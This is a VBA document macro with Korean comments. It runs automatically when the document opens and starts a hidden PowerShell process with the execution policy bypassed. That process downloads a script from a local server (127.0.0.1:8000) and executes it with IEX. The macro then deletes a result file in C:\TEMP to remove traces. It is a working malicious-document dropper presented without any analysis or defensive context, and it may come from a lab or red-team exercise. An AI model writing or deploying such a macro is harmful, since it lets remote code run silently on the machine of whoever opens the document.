Private Sub Document_Open()
    RunPowerShellScriptInBackground
End Sub

Sub RunPowerShellScriptInBackground()
    Dim objShell As Object
    Dim cmdStr As String
    
    ' PowerShell 실행 명령어 설정
    cmdStr = "powershell.exe -WindowStyle Hidden -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://127.0.0.1:8000/server.txt')) # "
    
    ' 새로운 Shell 객체 생성
    Set objShell = CreateObject("WScript.Shell")
    
    ' PowerShell 실행
    objShell.Run cmdStr, 0, False
    
    ' 시작 시간 기록
    startTime = Timer
    
    ' 결과 파일 삭제를 위해 5초간 일시 정지
    Do While Timer < startTime + 5
        DoEvents ' 이벤트 처리를 허용하여 문서가 멈추지 않게 함
    Loop
    
    ' 결과 파일 삭제
    DeleteResultFile
    
    ' 객체 해제
    Set objShell = Nothing
End Sub

Sub DeleteResultFile()
    Dim resultFilePath As String
    resultFilePath = "C:\TEMP\result.txt"
    
    ' 결과 파일 삭제
    If Dir(resultFilePath) <> "" Then
        Kill resultFilePath
    End If
End Sub


